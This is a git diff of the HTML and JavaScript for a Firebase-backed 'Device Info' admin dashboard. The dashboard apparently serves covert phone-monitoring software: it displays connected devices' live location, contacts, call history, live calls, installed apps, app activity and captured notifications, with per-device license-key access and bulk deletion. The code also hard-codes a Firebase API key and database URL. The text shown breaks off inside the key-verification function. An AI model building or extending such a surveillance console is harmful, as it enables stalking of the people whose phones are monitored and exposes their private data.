@@ -3,253 +3,1172 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Activity Detail Admin Panel</title>
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-database-compat.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-    
+    <title>Device Info - Professional Admin Dashboard</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <style>
         :root {
-            --bg: #000000;
-            --drawer-bg: #111111;
-            --card-bg: #121212;
-            --accent: #007bff;
-            --text: #ffffff;
-            --dim: #888888;
-            --border: #222222;
-            --danger: #ff4d4d;
+            --primary: #2563eb;
+            --primary-hover: #1d4ed8;
+            --bg-main: #f8fafc;
+            --surface: #ffffff;
+            --text-dark: #0f172a;
+            --text-muted: #64748b;
+            --border: #e2e8f0;
+            --header-bg: #0f172a;
+            --header-text: #ffffff;
+            --tab-active-text: #ffffff;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-        body { background: var(--bg); color: var(--text); height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
 
-        /* Navigation */
-        nav { height: 60px; background: #000; border-bottom: 1px solid var(--border); display: flex; align-items: center; padding: 0 20px; z-index: 100; }
-        .menu-btn { background: none; border: none; color: white; font-size: 24px; cursor: pointer; margin-right: 20px; }
-
-        /* Drawer */
-        #drawer-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: none; z-index: 200; }
-        #drawer { position: fixed; top: 0; left: -300px; width: 300px; height: 100%; background: var(--drawer-bg); z-index: 201; transition: 0.3s ease; box-shadow: 5px 0 15px rgba(0,0,0,0.5); display: flex; flex-direction: column; }
-        #drawer.open { left: 0; }
-        .drawer-header { padding: 25px; border-bottom: 1px solid var(--border); font-weight: 700; color: var(--accent); display: flex; justify-content: space-between; align-items: center; }
-        #user-list { flex: 1; overflow-y: auto; padding: 10px; }
-        .user-item { padding: 15px; border-radius: 8px; margin-bottom: 5px; cursor: pointer; transition: 0.2s; border: 1px solid transparent; }
-        .user-item:hover { background: rgba(255,255,255,0.05); }
-        .user-item.active { background: rgba(0, 168, 255, 0.1); border-color: var(--accent); }
-
-        /* Tabs */
-        .tabs { display: flex; background: #080808; border-bottom: 1px solid var(--border); }
-        .tab-btn { flex: 1; padding: 15px; background: none; border: none; color: var(--dim); cursor: pointer; font-weight: 600; border-bottom: 2px solid transparent; }
-        .tab-btn.active { color: var(--accent); border-bottom-color: var(--accent); }
-
-        /* Action Bar */
-        .action-bar { padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); background: #000; }
-
-        /* Content Scroll Area */
-        .content-area { flex: 1; overflow-y: auto; padding: 20px; }
-        .card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 12px; padding: 15px; margin-bottom: 15px; }
-        .card-header { display: flex; justify-content: space-between; margin-bottom: 10px; }
-        
-        .badge { font-size: 0.65rem; font-weight: 800; padding: 4px 10px; border-radius: 4px; text-transform: uppercase; cursor: default; }
-        .badge-pkg { background: rgba(0, 255, 136, 0.15); color: #00ff88; }
-        
-        /* Blue Badge with Click effect */
-        .badge-act { 
-            background: rgba(0, 168, 255, 0.15); 
-            color: var(--accent); 
-            cursor: pointer; 
-            transition: 0.2s;
-            max-width: 180px;
-            white-space: nowrap;
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background-color: var(--bg-main);
+            color: var(--text-dark);
+            display: flex;
+            height: 100vh;
             overflow: hidden;
-            text-overflow: ellipsis;
         }
-        .badge-act:hover { background: var(--accent); color: white; }
-        
-        .time-txt { font-size: 0.7rem; color: var(--dim); }
-        .title-txt { font-size: 1rem; font-weight: 700; color: #fff; margin-bottom: 5px; }
-        .info-txt { font-size: 0.85rem; color: #ccc; line-height: 1.4; margin-bottom: 10px; }
-        .del-btn { background: none; border: 1px solid #333; color: var(--danger); padding: 5px 12px; border-radius: 6px; font-size: 0.75rem; cursor: pointer; }
 
-        /* Modal for Full View */
-        #modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 300; padding: 20px; }
-        #modal-content { background: #1a1a1a; width: 100%; max-width: 500px; border-radius: 15px; border: 1px solid var(--border); animation: zoomIn 0.2s ease; }
-        @keyframes zoomIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
-        .modal-header { padding: 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; color: var(--accent); font-weight: 700; }
-        .modal-body { padding: 20px; color: #fff; font-size: 1rem; line-height: 1.6; word-wrap: break-word; max-height: 60vh; overflow-y: auto; }
-        .close-modal { background: none; border: none; color: #fff; font-size: 24px; cursor: pointer; }
+        .drawer-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(15, 23, 42, 0.5);
+            backdrop-filter: blur(3px);
+            z-index: 99;
+            display: none;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .drawer-overlay.active {
+            display: block;
+            opacity: 1;
+        }
 
-        .empty-msg { text-align: center; margin-top: 50px; color: var(--dim); }
-        .clear-btn { background: var(--danger); color: #fff; border: none; padding: 6px 12px; border-radius: 5px; font-size: 0.75rem; cursor: pointer; }
+        .drawer {
+            position: fixed;
+            top: 0;
+            left: -320px;
+            width: 320px;
+            height: 100%;
+            background: var(--surface);
+            box-shadow: 10px 0 30px rgba(15, 23, 42, 0.08);
+            display: flex;
+            flex-direction: column;
+            z-index: 100;
+            transition: left 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            border-right: 1px solid var(--border);
+        }
+
+        .drawer.open {
+            left: 0;
+        }
+
+        .drawer-header {
+            background: var(--header-bg);
+            color: white;
+            padding: 22px 20px;
+            font-size: 15px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .close-drawer-btn {
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.2s;
+        }
+
+        .device-list {
+            list-style: none;
+            overflow-y: auto;
+            flex: 1;
+            padding: 8px 0;
+        }
+
+        .device-item {
+            border-bottom: 1px solid var(--border);
+        }
+
+        .device-main {
+            padding: 14px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: var(--surface);
+            transition: background 0.2s;
+            cursor: pointer;
+        }
+
+        .device-main:hover {
+            background: #f1f5f9;
+        }
+
+        .device-name {
+            font-weight: 500;
+            color: var(--text-dark);
+            font-size: 14px;
+            flex: 1;
+        }
+
+        .arrow-btn {
+            background: none;
+            border: none;
+            font-size: 11px;
+            cursor: pointer;
+            color: var(--text-muted);
+            transition: transform 0.3s, color 0.2s;
+            padding: 6px 10px;
+        }
+
+        .arrow-btn.active {
+            transform: rotate(90deg);
+            color: var(--primary);
+        }
+
+        .device-specs {
+            display: none;
+            background: #f8fafc;
+            padding: 14px 20px;
+            font-size: 13px;
+            color: var(--text-muted);
+            border-top: 1px dashed var(--border);
+            line-height: 1.6;
+        }
+
+        .workspace {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .top-header {
+            height: 70px;
+            background: var(--header-bg);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            padding: 0 24px;
+            gap: 20px;
+            box-shadow: 0 4px 12px rgba(15, 23, 42, 0.1);
+            z-index: 10;
+        }
+
+        .menu-toggle {
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            padding: 8px;
+            border-radius: 6px;
+            transition: background 0.2s;
+        }
+
+        .menu-toggle span {
+            display: block;
+            width: 20px;
+            height: 2px;
+            background-color: var(--header-text);
+            border-radius: 2px;
+        }
+
+        .header-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--header-text);
+        }
+
+        .tabs-container {
+            display: flex;
+            background: var(--surface);
+            border-bottom: 1px solid var(--border);
+            overflow-x: auto;
+            white-space: nowrap;
+            padding: 0 16px;
+            gap: 8px;
+            scrollbar-width: thin;
+        }
+
+        .tab-btn {
+            background: transparent;
+            border: none;
+            padding: 12px 20px;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--text-muted);
+            cursor: pointer;
+            border-radius: 6px;
+            margin: 8px 0;
+            transition: all 0.2s ease;
+            flex-shrink: 0;
+            text-transform: capitalize;
+        }
+
+        .tab-btn:hover {
+            background: #f1f5f9;
+            color: var(--text-dark);
+        }
+
+        .tab-btn.active {
+            background: var(--primary);
+            color: var(--tab-active-text);
+            font-weight: 600;
+            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2);
+        }
+
+        .content-area {
+            flex: 1;
+            display: flex;
+            padding: 24px;
+            overflow-y: auto;
+            background-color: var(--bg-main);
+        }
+
+        .tab-pane {
+            display: none;
+            width: 100%;
+            height: 100%;
+        }
+
+        .tab-pane.active {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .full-card {
+            background: var(--surface);
+            border-radius: 16px;
+            box-shadow: 0 4px 24px rgba(15, 23, 42, 0.04);
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            border: 1px solid var(--border);
+            overflow: hidden;
+        }
+
+        .full-card-header {
+            padding: 20px 24px;
+            border-bottom: 1px solid var(--border);
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--text-dark);
+            background: #ffffff;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .menu-container {
+            position: relative;
+            display: inline-block;
+        }
+
+        .dots-btn {
+            background: none;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            color: var(--text-muted);
+            padding: 4px 8px;
+            border-radius: 4px;
+        }
+
+        .dropdown-menu {
+            display: none;
+            position: absolute;
+            right: 0;
+            top: 35px;
+            background: var(--surface);
+            box-shadow: 0 4px 12px rgba(15, 23, 42, 0.15);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            z-index: 10;
+            min-width: 130px;
+            overflow: hidden;
+        }
+
+        .dropdown-menu.show {
+            display: block;
+        }
+
+        .dropdown-item {
+            padding: 10px 16px;
+            font-size: 13px;
+            color: var(--text-dark);
+            cursor: pointer;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .dropdown-item:hover {
+            background: #f8fafc;
+            color: var(--primary);
+        }
+
+        .full-card-body {
+            flex: 1;
+            overflow-y: auto;
+            padding: 10px 24px;
+        }
+
+        .card {
+            background: var(--surface);
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 4px 24px rgba(15, 23, 42, 0.04);
+            max-width: 600px;
+            width: 100%;
+            margin: auto;
+            text-align: center;
+            border: 1px solid var(--border);
+        }
+
+        .coords, .data-box {
+            font-size: 13.5px;
+            margin: 15px 0;
+            color: #334155;
+            line-height: 1.6;
+            background: #f8fafc;
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid var(--border);
+            text-align: left;
+            overflow-y: auto;
+        }
+
+        .map-btn {
+            display: inline-block;
+            background-color: var(--primary);
+            color: white;
+            padding: 12px 28px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        .call-item {
+            border-bottom: 1px solid var(--border);
+            padding: 14px 0;
+        }
+
+        .call-main-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .call-info-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .call-icon {
+            width: 36px;
+            height: 36px;
+            background: #eff6ff;
+            color: var(--primary);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+
+        .call-phone {
+            font-weight: 600;
+            font-size: 14.5px;
+            color: var(--text-dark);
+        }
+
+        .call-badge {
+            background: #e0f2fe;
+            color: #0369a1;
+            font-size: 11px;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-weight: 500;
+            margin-left: 6px;
+        }
+
+        .call-right-action {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .call-last-time {
+            font-size: 12px;
+            color: var(--text-muted);
+            text-align: right;
+        }
+
+        .call-arrow {
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 11px;
+            color: var(--text-muted);
+            transition: transform 0.3s ease;
+            padding: 4px;
+        }
+
+        .call-arrow.open {
+            transform: rotate(180deg);
+            color: var(--primary);
+        }
+
+        .call-sublist {
+            display: none;
+            margin-top: 10px;
+            background: #f8fafc;
+            padding: 12px 16px;
+            border-radius: 10px;
+            border: 1px dashed var(--border);
+        }
+
+        .call-sublist.open {
+            display: block;
+        }
+
+        .sub-time-item {
+            font-size: 12.5px;
+            color: var(--text-muted);
+            padding: 6px 0;
+            display: flex;
+            justify-content: space-between;
+            border-bottom: 1px dashed #e2e8f0;
+        }
+
+        /* Modals */
+        .custom-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(15, 23, 42, 0.6);
+            backdrop-filter: blur(4px);
+            z-index: 200;
+            justify-content: center;
+            align-items: center;
+        }
+        .custom-modal.active {
+            display: flex;
+        }
+        .modal-content {
+            background: var(--surface);
+            padding: 24px;
+            border-radius: 16px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1);
+            border: 1px solid var(--border);
+        }
+        .modal-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: var(--text-dark);
+        }
+        .modal-actions {
+            display: flex;
+            justify-content: flex-end;
+            gap: 12px;
+            margin-top: 20px;
+        }
+        .btn-primary {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .btn-secondary {
+            background: #e2e8f0;
+            color: var(--text-dark);
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+        }
     </style>
 </head>
 <body>
 
-    <!-- Drawer Overlay -->
-    <div id="drawer-overlay" onclick="toggleDrawer()"></div>
-
-    <!-- Sidebar Drawer -->
-    <div id="drawer">
-        <div class="drawer-header">
-            <span>DEVICE MANAGER</span>
-            <button class="menu-btn" onclick="toggleDrawer()" style="margin:0;">×</button>
-        </div>
-        <div id="user-list"></div>
-    </div>
-
-    <!-- Modal for Full Text View -->
-    <div id="modal-overlay" onclick="closeModal()">
-        <div id="modal-content" onclick="event.stopPropagation()">
-            <div class="modal-header">
-                <span id="modal-title">Activity Detail</span>
-                <button class="close-modal" onclick="closeModal()">×</button>
+    <!-- Key Input Popup Modal -->
+    <div class="custom-modal" id="keyPromptModal">
+        <div class="modal-content">
+            <div class="modal-title">Enter License Key</div>
+            <p style="font-size:13px; color:var(--text-muted); margin-bottom:12px;" id="keyPromptDeviceName">Device: --</p>
+            <input type="text" id="deviceKeyInput" placeholder="Enter key for this device" style="width:100%; padding:10px; border:1px solid var(--border); border-radius:8px; font-size:14px; margin-bottom:10px;">
+            <div class="modal-actions">
+                <button class="btn-secondary" onclick="closeKeyModal()">Cancel</button>
+                <button class="btn-primary" onclick="verifyDeviceKey()">Verify & Open</button>
             </div>
-            <div class="modal-body" id="modal-body"></div>
         </div>
     </div>
 
-    <!-- Navbar -->
-    <nav>
-        <button class="menu-btn" onclick="toggleDrawer()">☰</button>
-        <div id="nav-title" style="font-weight: 600;">Select Device</div>
-    </nav>
+    <!-- Backdrop Overlay -->
+    <div class="drawer-overlay" id="drawerOverlay" onclick="toggleDrawer()"></div>
 
-    <div class="tabs">
-        <button id="tab-not" class="tab-btn active" onclick="switchTab('Users')">NOTIFICATIONS</button>
-        <button id="tab-act" class="tab-btn" onclick="switchTab('UserActivities')">ACTIVITIES</button>
+    <!-- Side Drawer -->
+    <div class="drawer" id="appDrawer">
+        <div class="drawer-header">
+            <span>Connected Devices</span>
+            <button class="close-drawer-btn" onclick="toggleDrawer()" title="Close Drawer">✕</button>
+        </div>
+        <ul class="device-list" id="deviceList">
+            <li style="padding: 20px; text-align: center; color: var(--text-muted); font-size: 13px;">Connecting...</li>
+        </ul>
     </div>
 
-    <div class="action-bar" id="action-bar" style="display: none;">
-        <span id="item-count" style="font-size: 0.75rem; color: var(--dim);"></span>
-        <button class="clear-btn" onclick="clearAll()">Clear Tab</button>
+    <!-- Custom Alert Modal -->
+    <div class="custom-modal" id="alertModal">
+        <div class="modal-content">
+            <div class="modal-title" id="alertModalTitle">Notification</div>
+            <div style="font-size: 14px; color: var(--text-muted); margin-bottom: 20px;" id="alertModalMessage">Message here...</div>
+            <div class="modal-actions">
+                <button class="btn-primary" onclick="closeAlertModal()">OK</button>
+            </div>
+        </div>
     </div>
 
-    <main id="content-container" class="content-area">
-        <div class="empty-msg">Menu se device select karein.</div>
-    </main>
+    <!-- Selection & Date/Tag Filter Modal -->
+    <div class="custom-modal" id="filterModal">
+        <div class="modal-content" style="max-width: 450px;">
+            <div class="modal-title" id="modalTitleText">Select & Filter Logs</div>
+            <div style="display: flex; gap: 10px; margin-bottom: 12px;">
+                <div style="flex: 1;">
+                    <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Filter by Date:</label>
+                    <input type="date" id="filterDateInput" oninput="applyFilters()" style="width: 100%; padding: 8px; border: 1px solid var(--border); border-radius: 6px; font-size: 13px;">
+                </div>
+                <div style="flex: 1;">
+                    <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Search Tag / Text:</label>
+                    <input type="text" id="filterTagInput" placeholder="e.g. A or 9" oninput="applyFilters()" style="width: 100%; padding: 8px; border: 1px solid var(--border); border-radius: 6px; font-size: 13px;">
+                </div>
+            </div>
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">
+                <span style="font-size: 12px; font-weight: 500; color: var(--text-muted);">Select Items:</span>
+                <button style="background:none; border:none; color:var(--primary); font-size:12px; cursor:pointer;" onclick="toggleSelectAllItems(true)">Select All</button>
+            </div>
+            <div style="max-height: 220px; overflow-y: auto; border: 1px solid var(--border); border-radius: 6px; padding: 10px;" id="modalItemsContainer"></div>
+            <div class="modal-actions">
+                <button class="btn-secondary" onclick="closeFilterModal()">Cancel</button>
+                <button class="btn-primary" onclick="deleteSelectedItems()">Delete Selected</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Workspace -->
+    <div class="workspace">
+        <header class="top-header">
+            <button class="menu-toggle" onclick="toggleDrawer()" title="Toggle Menu">
+                <span></span><span></span><span></span>
+            </button>
+            <div class="header-title" id="activeDeviceTitle">Device Info Dashboard</div>
+        </header>
+
+        <div class="tabs-container">
+            <button class="tab-btn active" onclick="switchTab('location', this)">location</button>
+            <button class="tab-btn" onclick="switchTab('contact', this)">contact</button>
+            <button class="tab-btn" onclick="switchTab('call-history', this)">call history</button>
+            <button class="tab-btn" onclick="switchTab('live-call', this)">live call</button>
+            <button class="tab-btn" onclick="switchTab('apps', this)">apps</button>
+            <button class="tab-btn" onclick="switchTab('app-activity', this)">app activity</button>
+            <button class="tab-btn" onclick="switchTab('notification', this)">notification</button>
+        </div>
+
+        <div class="content-area">
+            <div id="location-pane" class="tab-pane active">
+                <div class="card">
+                    <h2>Live Location Tracker</h2>
+                    <div class="coords" id="locationData">Please select a device from the side drawer to view details.</div>
+                    <a id="mapLink" href="#" class="map-btn" target="_blank" style="display:none;">Open in Google Maps</a>
+                    <div class="status" id="statusText" style="font-size: 12px; color: var(--text-muted); margin-top: 15px;">Status: No device selected</div>
+                </div>
+            </div>
+
+            <div id="contact-pane" class="tab-pane">
+                <div class="full-card">
+                    <div class="full-card-header">
+                        <span>Contact List</span>
+                        <div class="menu-container">
+                            <button class="dots-btn" onclick="toggleMenu('contactMenu')">⋮</button>
+                            <div class="dropdown-menu" id="contactMenu">
+                                <div class="dropdown-item" onclick="confirmDeleteAll('Contacts')">Delete All</div>
+                                <div class="dropdown-item" onclick="openSelectModal('Contacts')">Select & Filter</div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="full-card-body" id="contactData" style="padding: 20px;">Please select a device first.</div>
+                </div>
+            </div>
+
+            <div id="call-history-pane" class="tab-pane">
+                <div class="full-card">
+                    <div class="full-card-header">
+                        <span>Call History Logs</span>
+                        <div class="menu-container">
+                            <button class="dots-btn" onclick="toggleMenu('callMenu')">⋮</button>
+                            <div class="dropdown-menu" id="callMenu">
+                                <div class="dropdown-item" onclick="confirmDeleteAll('CallLogs')">Delete All</div>
+                                <div class="dropdown-item" onclick="openSelectModal('CallLogs')">Select & Filter</div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="full-card-body" id="callHistoryData">
+                        <div style="text-align: center; color: var(--text-muted); padding: 40px;">Please select a device first.</div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="live-call-pane" class="tab-pane">
+                <div class="card">
+                    <h2>Live Call Monitoring</h2>
+                    <div class="data-box" id="liveCallData">Please select a device first.</div>
+                </div>
+            </div>
+
+            <div id="apps-pane" class="tab-pane">
+                <div class="full-card">
+                    <div class="full-card-header">
+                        <span>Installed Applications</span>
+                        <div class="menu-container">
+                            <button class="dots-btn" onclick="toggleMenu('appsMenu')">⋮</button>
+                            <div class="dropdown-menu" id="appsMenu">
+                                <div class="dropdown-item" onclick="confirmDeleteAll('InstalledApps')">Delete All</div>
+                                <div class="dropdown-item" onclick="openSelectModal('InstalledApps')">Select & Filter</div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="full-card-body" id="appsData" style="padding: 20px;">Please select a device first.</div>
+                </div>
+            </div>
+
+            <div id="app-activity-pane" class="tab-pane">
+                <div class="card">
+                    <h2>Live App Activity</h2>
+                    <div class="data-box" id="appActivityData">Please select a device first.</div>
+                </div>
+            </div>
+
+            <div id="notification-pane" class="tab-pane">
+                <div class="full-card">
+                    <div class="full-card-header">
+                        <span>Captured Notifications</span>
+                        <div class="menu-container">
+                            <button class="dots-btn" onclick="toggleMenu('notifMenu')">⋮</button>
+                            <div class="dropdown-menu" id="notifMenu">
+                                <div class="dropdown-item" onclick="confirmDeleteAll('Notifications')">Delete All</div>
+                                <div class="dropdown-item" onclick="openSelectModal('Notifications')">Select & Filter</div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="full-card-body" id="notificationData" style="padding: 20px;">Please select a device first.</div>
+                </div>
+            </div>
+        </div>
+    </div>
 
     <script>
-        // --- YOUR FIREBASE CONFIG ---
         const firebaseConfig = {
-            apiKey: "YOUR_API_KEY",
-            databaseURL: "https://notification-reader-acacb-default-rtdb.firebaseio.com/",
-            projectId: "notification-reader-acacb",
-            appId: "YOUR_APP_ID"
+            apiKey: "AIzaSyDR4SEETTII3fynioJtLYwKJVbgNz5CTlc",
+            projectId: "call-logs-ac785",
+            databaseURL: "https://call-logs-ac785-default-rtdb.firebaseio.com",
+            appId: "1:414875070463:android:27d075930002f55594c1ca"
         };
-
         firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-        let selectedId = null;
-        let currentTab = 'Users';
+        const rtdb = firebase.database();
+
+        const deviceListEl = document.getElementById('deviceList');
+        const locationDataEl = document.getElementById('locationData');
+        const mapLinkEl = document.getElementById('mapLink');
+        const statusTextEl = document.getElementById('statusText');
+        const contactDataEl = document.getElementById('contactData');
+        const callHistoryDataEl = document.getElementById('callHistoryData');
+        const liveCallDataEl = document.getElementById('liveCallData');
+        const appsDataEl = document.getElementById('appsData');
+        const appActivityDataEl = document.getElementById('appActivityData');
+        const notificationDataEl = document.getElementById('notificationData');
+        const activeDeviceTitleEl = document.getElementById('activeDeviceTitle');
+
+        let selectedDeviceId = null;
+        let pendingDevice = null;
+        let liveCallListener = null;
+        let currentActiveDataType = '';
+        let rawDeviceDataCache = {};
+
+        function showAlert(title, msg) {
+            document.getElementById('alertModalTitle').innerText = title;
+            document.getElementById('alertModalMessage').innerText = msg;
+            document.getElementById('alertModal').classList.add('active');
+        }
+        function closeAlertModal() {
+            document.getElementById('alertModal').classList.remove('active');
+        }
 
         function toggleDrawer() {
-            const drw = document.getElementById('drawer');
-            const ovr = document.getElementById('drawer-overlay');
-            drw.classList.toggle('open');
-            ovr.style.display = drw.classList.contains('open') ? 'block' : 'none';
+            document.getElementById('appDrawer').classList.toggle('open');
+            document.getElementById('drawerOverlay').classList.toggle('active');
         }
 
-        function openModal(text, title = "Full View") {
-            document.getElementById('modal-title').innerText = title;
-            document.getElementById('modal-body').innerText = text;
-            document.getElementById('modal-overlay').style.display = 'flex';
+        function switchTab(tabName, btnElement) {
+            document.querySelectorAll('.tab-pane').forEach(pane => pane.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            document.getElementById(tabName + '-pane').classList.add('active');
+            if (btnElement) btnElement.classList.add('active');
         }
 
-        function closeModal() {
-            document.getElementById('modal-overlay').style.display = 'none';
+        function toggleMenu(menuId) {
+            event.stopPropagation();
+            document.querySelectorAll('.dropdown-menu').forEach(m => {
+                if(m.id !== menuId) m.classList.remove('show');
+            });
+            document.getElementById(menuId).classList.toggle('show');
+        }
+        window.onclick = function() {
+            document.querySelectorAll('.dropdown-menu').forEach(m => m.classList.remove('show'));
         }
 
-        // Fetch Devices
-        db.ref('Users').on('value', snap => {
-            const list = document.getElementById('user-list');
-            list.innerHTML = '';
-            const data = snap.val();
-            if (data) {
-                Object.keys(data).forEach(id => {
-                    const div = document.createElement('div');
-                    div.className = `user-item ${id === selectedId ? 'active' : ''}`;
-                    div.innerHTML = `<div style="font-size: 0.8rem; font-family: monospace;">${id}</div>`;
-                    div.onclick = () => selectUser(id);
-                    list.appendChild(div);
+        // Load devices list normally when page opens
+        rtdb.ref('LiveLocation').on('value', (snapshot) => {
+            const devices = snapshot.val();
+            deviceListEl.innerHTML = "";
+
+            if (devices) {
+                Object.keys(devices).forEach(deviceId => {
+                    const dev = devices[deviceId];
+                    const devName = dev.deviceName || "Unknown Device";
+                    const battery = dev.battery || "N/A";
+                    const provider = dev.provider || "N/A";
+                    const ram = dev.ram || "N/A";
+                    const storage = dev.storage || "N/A";
+                    const time = dev.timestamp ? new Date(parseInt(dev.timestamp)).toLocaleTimeString() : "N/A";
+
+                    const li = document.createElement('li');
+                    li.className = 'device-item';
+                    li.innerHTML = `
+                        <div class="device-main" onclick="requestDeviceAccess('${deviceId}', '${devName}')">
+                            <span class="device-name">${devName}</span>
+                            <button class="arrow-btn" onclick="event.stopPropagation(); toggleSpecs(this)">▶</button>
+                        </div>
+                        <div class="device-specs">
+                            <b>Battery:</b> ${battery}<br>
+                            <b>Provider:</b> ${provider}<br>
+                            <b>RAM:</b> ${ram}<br>
+                            <b>Storage:</b> ${storage}<br>
+                            <b>Last Active:</b> ${time}
+                        </div>
+                    `;
+                    deviceListEl.appendChild(li);
                 });
+            } else {
+                deviceListEl.innerHTML = `<li style="padding: 20px; text-align: center; color: var(--text-muted); font-size: 13px;">No devices connected.</li>`;
             }
         });
 
-        function selectUser(id) {
-            selectedId = id;
-            document.getElementById('nav-title').innerText = "ID: " + id;
-            document.getElementById('action-bar').style.display = "flex";
-            toggleDrawer();
-            refreshData();
+        function toggleSpecs(btn) {
+            const specsDiv = btn.parentElement.nextElementSibling;
+            if (specsDiv.style.display === "block") {
+                specsDiv.style.display = "none";
+                btn.classList.remove('active');
+            } else {
+                specsDiv.style.display = "block";
+                btn.classList.add('active');
+            }
         }
 
-        function switchTab(tab) {
-            currentTab = tab;
-            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-            if(tab === 'Users') document.getElementById('tab-not').classList.add('active');
-            else document.getElementById('tab-act').classList.add('active');
-            if(selectedId) refreshData();
+        // When user clicks a device, prompt for key verification
+        function requestDeviceAccess(deviceId, deviceName) {
+            pendingDevice = { id: deviceId, name: deviceName };
+            document.getElementById('keyPromptDeviceName').innerText = `Device: ${deviceName}`;
+            document.getElementById('deviceKeyInput').value = '';
+            document.getElementById('keyPromptModal').classList.add('active');
         }
 
-        function refreshData() {
-            const container = document.getElementById('content-container');
-            const path = `${currentTab}/${selectedId}`;
-            
-            db.ref(path).off();
-            db.ref(path).on('value', snap => {
-                container.innerHTML = '';
-                const items = snap.val();
-                if(!items) {
-                    container.innerHTML = `<div class="empty-msg">No entries found.</div>`;
-                    return;
-                }
+        function closeKeyModal() {
+            document.getElementById('keyPromptModal').classList.remove('active');
+            pendingDevice = null;
+        }
 
-                const keys = Object.keys(items);
-                document.getElementById('item-count').innerText = keys.length + " items";
+        // Verify entered key against Firebase DeviceKeys dynamically
+        function verifyDeviceKey() {
+            const enteredKey = document.getElementById('deviceKeyInput').value.trim();
+            if (!enteredKey) {
+                showAlert("Error", "Kripya key enter karein!");
+                return;
+            }
 
-                keys.reverse().forEach(key => {
-                    const val = items[key];
-                    const card = document.createElement('div');
-                    card.className = 'card';
+            if (!pendingDevice) {
